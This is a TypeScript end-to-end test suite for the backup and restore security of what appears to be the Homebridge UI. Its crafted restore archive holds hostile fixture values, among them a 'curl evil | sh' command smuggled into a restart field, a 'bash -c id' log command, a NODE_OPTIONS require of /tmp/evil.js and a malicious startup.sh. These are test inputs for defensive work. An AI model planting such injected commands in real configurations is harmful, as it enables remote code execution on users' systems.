import type { NestFastifyApplication } from '@nestjs/platform-fastify'

import { EventEmitter } from 'node:events'
import { createReadStream } from 'node:fs'
import { mkdtemp, stat } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join, resolve } from 'node:path'
import process from 'node:process'

import { ValidationPipe } from '@nestjs/common'
import { FastifyAdapter } from '@nestjs/platform-fastify'
import { Test } from '@nestjs/testing'
import { copy, outputFile, outputJson, pathExists, readdir, readFile, readJson, remove } from 'fs-extra'
import { create as tarCreate, list as tarList } from 'tar'
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'

import { AuthModule } from '../../src/core/auth/auth.module.js'
import { ConfigService } from '../../src/core/config/config.service.js'
import { HomebridgeIpcService } from '../../src/core/homebridge-ipc/homebridge-ipc.service.js'
import { SchedulerService } from '../../src/core/scheduler/scheduler.service.js'
import { BackupModule } from '../../src/modules/backup/backup.module.js'
import { BackupService } from '../../src/modules/backup/backup.service.js'
import { InstalledPluginsService } from '../../src/modules/plugins/installed-plugins.service.js'
import { PluginsService } from '../../src/modules/plugins/plugins.service.js'
import { testStoragePath } from '../storage-path.js'

import '../../src/global-defaults.js'

const isPosix = process.platform !== 'win32'

describe('Backup security (e2e)', { timeout: 30_000 }, () => {
  let app: NestFastifyApplication
  let backupService: BackupService
  let configService: ConfigService
  let pluginsService: PluginsService
  let ipcService: HomebridgeIpcService
  let schedulerService: SchedulerService
  let authorization: string

  const storage = testStoragePath
  const configPath = resolve(storage, 'config.json')
  const secretsPath = resolve(storage, '.uix-secrets')
  const startupJsonPath = resolve(storage, '.uix-hb-service-homebridge-startup.json')
  const mocks = resolve(__dirname, '../mocks')

  const seedStorage = async () => {
    await copy(resolve(mocks, 'config.json'), configPath)
    await copy(resolve(mocks, 'auth.json'), resolve(storage, 'auth.json'))
    await copy(resolve(mocks, '.uix-hb-service-homebridge-startup.json'), startupJsonPath)
  }

  /** Build a .tar.gz from a map of relative path -> contents */
  const buildTarball = async (files: Record<string, string | object>) => {
    const staging = await mkdtemp(join(tmpdir(), 'crafted-backup-'))
    for (const [path, contents] of Object.entries(files)) {
      if (typeof contents === 'string') {
        await outputFile(join(staging, path), contents)
      } else {
        await outputJson(join(staging, path), contents)
      }
    }
    const tarPath = join(tmpdir(), `crafted-${Date.now()}-${Math.random().toString(36).slice(2)}.tar.gz`)
    const top = [...new Set(Object.keys(files).map(p => p.split('/')[0]))]
    await tarCreate({ gzip: true, cwd: staging, file: tarPath, portable: true }, top)
    await remove(staging)
    return tarPath
  }

  const login = async () => app.inject({
    method: 'POST',
    path: '/auth/login',
    payload: { username: 'admin', password: 'admin' },
  })

  beforeAll(async () => {
    process.env.UIX_BASE_PATH = resolve(__dirname, '../../')
    process.env.UIX_STORAGE_PATH = storage
    process.env.UIX_CONFIG_PATH = configPath
    process.env.UIX_CUSTOM_PLUGIN_PATH = resolve(storage, 'plugins/node_modules')

    await seedStorage()
    await copy(resolve(mocks, '.uix-secrets'), secretsPath)
    await copy(resolve(mocks, 'plugins'), process.env.UIX_CUSTOM_PLUGIN_PATH)

    const moduleFixture = await Test.createTestingModule({
      imports: [BackupModule, AuthModule],
    }).compile()

    app = moduleFixture.createNestApplication<NestFastifyApplication>(new FastifyAdapter())
    app.useGlobalPipes(new ValidationPipe({ whitelist: true, skipMissingProperties: true }))
    await app.init()
    await app.getHttpAdapter().getInstance().ready()

    backupService = app.get(BackupService)
    configService = app.get(ConfigService)
    pluginsService = app.get(PluginsService)
    ipcService = app.get(HomebridgeIpcService)
    schedulerService = app.get(SchedulerService)
    ;(app.get(InstalledPluginsService) as any)._paths = [process.env.UIX_CUSTOM_PLUGIN_PATH]

    authorization = `bearer ${(await login()).json().access_token}`
  })

  beforeEach(async () => {
    await seedStorage()
    await backupService.removeRestoreDirectory()
    vi.spyOn(pluginsService, 'managePlugin').mockResolvedValue(true)
    configService.instanceBackupPath = resolve(storage, 'backups/instance-backups')
    delete configService.ui.scheduledBackupPath
  })

  afterEach(() => {
    vi.restoreAllMocks()
    vi.useRealTimers()
  })

  afterAll(async () => {
    schedulerService.scheduledJobs['instance-backup']?.cancel()
    await app.close()
  })

  describe('backup creation', () => {
    it('leaves the JWT secret and hb-service startup options out of the archive', async () => {
      const { backupDir, backupPath } = await (backupService as any).createBackup()
      try {
        const entries: string[] = []
        await tarList({ file: backupPath, onReadEntry: (e: any) => entries.push(e.path) })

        expect(entries).toContain('storage/config.json')
        expect(entries).toContain('storage/auth.json')
        expect(entries.some(e => e.endsWith('.uix-secrets'))).toBe(false)
        expect(entries.some(e => e.endsWith('.uix-hb-service-homebridge-startup.json'))).toBe(false)

        const modes = isPosix
          ? [(await stat(backupPath)).mode & 0o777, (await stat(backupDir)).mode & 0o777]
          : [0o600, 0o700]
        expect(modes).toEqual([0o600, 0o700])
      } finally {
        await remove(backupDir)
      }
    })

    it.runIf(isPosix)('writes scheduled backups 0600 into a 0700 instance-backups directory', async () => {
      await remove(configService.instanceBackupPath)

      await backupService.createBackupInDirectory()

      expect((await stat(configService.instanceBackupPath)).mode & 0o777).toBe(0o700)
      const files = await readdir(configService.instanceBackupPath)
      expect(files).toHaveLength(1)
      expect((await stat(join(configService.instanceBackupPath, files[0]))).mode & 0o777).toBe(0o600)
    })

    it.runIf(isPosix)('the scheduled job also writes 0600 archives', async () => {
      await remove(configService.instanceBackupPath)

      await backupService.runScheduledBackupJob()

      const files = await readdir(configService.instanceBackupPath)
      expect(files).toHaveLength(1)
      expect((await stat(join(configService.instanceBackupPath, files[0]))).mode & 0o777).toBe(0o600)
    })
  })

  describe('restore', () => {
    it('restores config.json and accessories, refuses excluded files, and sanitises unsafe commands', async () => {
      const secretsBefore = await readFile(secretsPath, 'utf8')
      const tarPath = await buildTarball({
        'info.json': { timestamp: new Date().toISOString(), platform: 'linux', uix: '1.0.0', node: 'v22.12.0' },
        'plugins.json': [],
        'storage/config.json': {
          bridge: { name: 'Restored Bridge', port: 51999, pin: '111-22-333', username: '0E:11:22:33:44:55' },
          accessories: [{ accessory: 'Restored', name: 'R' }],
          platforms: [{
            platform: 'config',
            name: 'Config',
            port: 9999,
            restart: 'sudo systemctl restart homebridge; curl evil | sh',
            log: { method: 'custom', command: 'bash -c id' },
            theme: 'purple',
          }],
        },
        'storage/accessories/cachedAccessories': [{ UUID: 'restored-uuid' }],
        'storage/.uix-secrets': { secretKey: 'attacker-chosen' },
        'storage/.uix-hb-service-homebridge-startup.json': { env: { NODE_OPTIONS: '--require /tmp/evil.js' } },
        'storage/startup.sh': '#!/bin/sh\ncurl evil | sh\n',
        'storage/.docker.env': 'EVIL=1',
        'storage/node_modules/evil/index.js': 'process.exit(1)',
        'storage/.git/config': '[core]',
        'storage/.npm/x': 'x',
      })

      await backupService.uploadBackupRestore({ file: createReadStream(tarPath) } as any)
      await remove(tarPath)
      // The startup json seeded by beforeEach must survive, not be replaced
      const startupBefore = await readFile(startupJsonPath, 'utf8')

      const client = new EventEmitter()
      const emit = vi.spyOn(client, 'emit')
      const warn = vi.spyOn((backupService as any).logger, 'warn')
      configService.enableTerminalAccess = false

      await backupService.restoreFromBackup(client)

      // config.json really restored, with the instance's own ports kept
      const restored = await readJson(configPath)
      expect(restored.bridge.name).toBe('Restored Bridge')
      expect(restored.bridge.port).toBe(configService.homebridgeConfig.bridge.port)
      expect(restored.accessories).toEqual([{ accessory: 'Restored', name: 'R' }])
      const ui = restored.platforms.find((p: any) => p.platform === 'config')
      expect(ui.port).toBe(configService.ui.port)
      expect(ui.theme).toBe('purple')
      // Unsafe command values removed, with a clear log line
      expect(ui.restart).toBeUndefined()
      expect(ui.log).toEqual({ method: 'custom' })
      expect(warn).toHaveBeenCalledWith(expect.stringContaining('removed the unsafe "restart" value'))
      expect(warn).toHaveBeenCalledWith(expect.stringContaining('removed the unsafe "log.command" value'))
      expect(emit).toHaveBeenCalledWith('stdout', expect.stringContaining('Removed unsafe "restart"'))

      // accessories restored
      expect(await readJson(resolve(storage, 'accessories/cachedAccessories'))).toEqual([{ UUID: 'restored-uuid' }])

      // Everything a backup excludes is refused on restore
      expect(await readFile(secretsPath, 'utf8')).toBe(secretsBefore)
      expect(await readFile(startupJsonPath, 'utf8')).toBe(startupBefore)
      expect(await pathExists(resolve(storage, 'startup.sh'))).toBe(false)
      expect(await pathExists(resolve(storage, '.docker.env'))).toBe(false)
      expect(await pathExists(resolve(storage, 'node_modules/evil'))).toBe(false)
      expect(await pathExists(resolve(storage, '.git'))).toBe(false)
      expect(await pathExists(resolve(storage, '.npm'))).toBe(false)
      expect(emit).toHaveBeenCalledWith('stdout', 'Skipping .uix-secrets\r\n')

      // The instance keeps its own signing secret: old tokens and new logins work
      const res = await app.inject({ method: 'GET', path: '/backup/scheduled-backups/next', headers: { authorization } })
      expect(res.statusCode).toBe(200)
      const loginRes = await login()
      expect(loginRes.statusCode).toBe(201)
      expect(loginRes.json().access_token).toBeTruthy()
    })

    it('refuses an archive without info.json and removes the temp directory', async () => {
      const tarPath = await buildTarball({
        'plugins.json': [],
        'storage/config.json': { bridge: {} },
      })
      await backupService.uploadBackupRestore({ file: createReadStream(tarPath) } as any)
      await remove(tarPath)
      const restoreDir = (backupService as any).restoreDirectory as string
      expect(await pathExists(restoreDir)).toBe(true)
      const configBefore = await readFile(configPath, 'utf8')

      await expect(backupService.restoreFromBackup(new EventEmitter()))
        .rejects
        .toThrow('not a valid Homebridge Backup Archive')

      expect(await pathExists(restoreDir)).toBe(false)
      expect((backupService as any).restoreDirectory).toBeUndefined()
      expect(await readFile(configPath, 'utf8')).toBe(configBefore)
    })
  })

  describe('hbfx restore', () => {
    it('maps plugins, renames the bridge without a username, skips config/access files and drops bad bind interfaces', async () => {
      const secretsBefore = await readFile(secretsPath, 'utf8')
      await remove(resolve(storage, 'persist/AccessoryInfo.HBFX.json'))
      await remove(resolve(storage, 'access.json'))
      await remove(resolve(storage, 'dashboard.json'))

      await backupService.uploadHbfxRestore({ file: createReadStream(resolve(mocks, 'hbfx/backup.hbfx')) } as any)
      const restoreDir = (backupService as any).restoreDirectory as string

      const client = new EventEmitter()
      await backupService.restoreHbfxBackup(client)

      // Plugins installed under their Homebridge names
      expect(pluginsService.managePlugin).toHaveBeenCalledWith('install', { name: 'homebridge-hue', version: 'latest' }, client)
      expect(pluginsService.managePlugin).toHaveBeenCalledWith('install', { name: 'homebridge-dummy', version: 'latest' }, client)

      const config = await readJson(configPath)
      // Missing bridge.username falls back to this instance's username
      const username = configService.homebridgeConfig.bridge.username
      expect(config.bridge.username).toBe(username)
      expect(config.bridge.name).toBe(`Homebridge ${username.substring(username.length - 5).replace(/:/g, '')}`)
      expect(config.bridge.pin).toBe('031-45-154')
      // checkBridgeBindConfig dropped the interface that doesn't exist here
      expect(config.bridge.bind).toBeUndefined()
      // plugin_map stripped, google-home renamed
      expect(config.accessories).toEqual([{ accessory: 'DummySwitch', name: 'Switch' }])
      expect(config.platforms[0]).toMatchObject({ platform: 'google-smarthome', token: 'abc' })
      expect(config.platforms[0].plugin_map).toBeUndefined()
      // The archive's own UI block (with an unsafe restart) is replaced by this instance's
      const uiBlocks = config.platforms.filter((p: any) => p.platform === 'config')
      expect(uiBlocks).toHaveLength(1)
      expect(uiBlocks[0].restart).toBe(configService.ui.restart)

      // Files restored / skipped
      expect(await readJson(resolve(storage, 'accessories/cachedAccessories'))).toEqual([{ UUID: 'hbfx-cached' }])
      expect(await readJson(resolve(storage, 'persist/AccessoryInfo.HBFX.json'))).toEqual({ hbfx: 'persist' })
      expect(await pathExists(resolve(storage, 'access.json'))).toBe(false)
      expect(await pathExists(resolve(storage, 'dashboard.json'))).toBe(false)
      expect(await readFile(secretsPath, 'utf8')).toBe(secretsBefore)

      expect(await pathExists(restoreDir)).toBe(false)
      expect(configService.hbServiceUiRestartRequired).toBe(true)

      await remove(resolve(storage, 'persist/AccessoryInfo.HBFX.json'))
    })
  })

  describe('postBackupRestoreRestart', () => {
    it('does not kill the UI when the Homebridge SIGKILL was not delivered', async () => {
      vi.useFakeTimers()
      const killHomebridge = vi.spyOn(ipcService, 'killHomebridge').mockResolvedValue(false)
      const kill = vi.spyOn(process, 'kill').mockImplementation(() => true)
      const error = vi.spyOn((backupService as any).logger, 'error')

      expect(backupService.postBackupRestoreRestart()).toEqual({ status: 0 })
      expect(killHomebridge).not.toHaveBeenCalled()

      await vi.advanceTimersByTimeAsync(2000)

      expect(killHomebridge).toHaveBeenCalledTimes(1)
      expect(error).toHaveBeenCalledWith(expect.stringContaining('Skipping UI self-kill'))
      expect(kill).not.toHaveBeenCalled()
    })

    it('kills the UI 500ms after Homebridge was killed', async () => {
      vi.useFakeTimers()
      vi.spyOn(ipcService, 'killHomebridge').mockResolvedValue(true)
      const kill = vi.spyOn(process, 'kill').mockImplementation(() => true)

      backupService.postBackupRestoreRestart()
      await vi.advanceTimersByTimeAsync(600)
      expect(kill).not.toHaveBeenCalled()

      await vi.advanceTimersByTimeAsync(500)
      expect(kill).toHaveBeenCalledWith(process.pid, 'SIGKILL')
    })
  })
})
